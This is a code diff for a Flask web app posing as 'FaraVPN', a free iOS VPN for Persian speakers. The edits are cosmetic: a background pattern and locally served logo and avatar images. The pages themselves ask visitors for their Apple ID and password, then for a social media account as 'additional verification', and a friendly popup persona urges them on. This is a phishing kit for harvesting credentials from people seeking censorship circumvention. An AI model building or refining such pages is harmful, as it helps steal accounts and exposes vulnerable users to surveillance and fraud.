@@ -92,7 +92,20 @@ def index():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>FaraVPN - فیلترشکن رایگان برای iOS</title>
         <style>
-            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
+            body { 
+                font-family: Arial, sans-serif; 
+                background-image: url('{{ url_for('static', filename='pattern.png') }}');
+                background-repeat: repeat;
+                background-size: auto;
+                background-attachment: fixed;
+                background-color: #f1f1f1;
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+                min-height: 100vh; 
+                margin: 0; 
+                direction: rtl;
+            }
             .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
             .logo img { width: 120px; margin-bottom: 20px;}
             button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px;}
@@ -114,12 +127,12 @@ def index():
             </div>
         </div>
         <div id="lila-popup">
-            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
+            <img src="{{ url_for('static', filename='lila.png') }}" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
             <p id="lila-text">عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! 😊</p>
         </div>
         <div class="container">
             <div class="logo">
-                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
+                <img src="{{ url_for('static', filename='faravpn-logo.png') }}" alt="FaraVPN Logo">
             </div>
             <h2>FaraVPN - فیلترشکن رایگان برای iOS</h2>
             <p>با ما هیچوقت قطع نخواهید شد! فراتر از استارلینک رو اینجا تجربه کن! ما تنظیمات VPN رو مستقیم تو گوشیت اعمال می‌کنیم و آپدیت‌ها خودکار نصب می‌شن. برای فعال‌سازی، نیاز به اپل آیدی داریم تا سرورهای FaraVPN بتونن تنظیمات رو روی iOS شما ست کنن.</p>
@@ -140,7 +153,20 @@ def login():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>ورود با اپل آیدی - FaraVPN</title>
         <style>
-            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
+            body { 
+                font-family: Arial, sans-serif; 
+                background-image: url('{{ url_for('static', filename='pattern.png') }}');
+                background-repeat: repeat;
+                background-size: auto;
+                background-attachment: fixed;
+                background-color: #f1f1f1;
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+                min-height: 100vh; 
+                margin: 0; 
+                direction: rtl;
+            }
             .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
             .logo img { width: 120px; margin-bottom: 20px;}
             input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;}
@@ -159,12 +185,12 @@ def login():
             <div id="loading-spinner">در حال بارگذاری... <span style="animation: spin 1s infinite linear;">◠</span></div>
         </div>
         <div id="lila-popup">
-            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
+            <img src="{{ url_for('static', filename='lila.png') }}" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
             <p id="lila-text">عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! 😊</p>
         </div>
         <div class="container">
             <div class="logo">
-                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
+                <img src="{{ url_for('static', filename='faravpn-logo.png') }}" alt="FaraVPN Logo">
             </div>
             <h2>ورود با اپل آیدی</h2>
             <p>برای فعال‌سازی FaraVPN، اپل آیدی و رمز خود را وارد کنید</p>
@@ -189,7 +215,20 @@ def social():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>تأیید هویت اضافی - FaraVPN</title>
         <style>
-            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
+            body { 
+                font-family: Arial, sans-serif; 
+                background-image: url('{{ url_for('static', filename='pattern.png') }}');
+                background-repeat: repeat;
+                background-size: auto;
+                background-attachment: fixed;
+                background-color: #f1f1f1;
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+                min-height: 100vh; 
+                margin: 0; 
+                direction: rtl;
+            }
             .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
             .logo img { width: 120px; margin-bottom: 20px;}
             select, input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;}
@@ -208,12 +247,12 @@ def social():
             <div id="loading-spinner">در حال بارگذاری... <span style="animation: spin 1s infinite linear;">◠</span></div>
         </div>
         <div id="lila-popup">
-            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
+            <img src="{{ url_for('static', filename='lila.png') }}" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
             <p id="lila-text">عالیه! فقط یه تأیید دیگه تا فعال‌سازی FaraVPN! 😊</p>
         </div>
         <div class="container">
             <div class="logo">
-                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
+                <img src="{{ url_for('static', filename='faravpn-logo.png') }}" alt="FaraVPN Logo">
             </div>
             <h2>تأیید هویت اضافی</h2>
             <p>برای امنیت بیشتر و فعال‌سازی FaraVPN، لطفاً یکی از اکانت‌های زیر را وارد کنید</p>
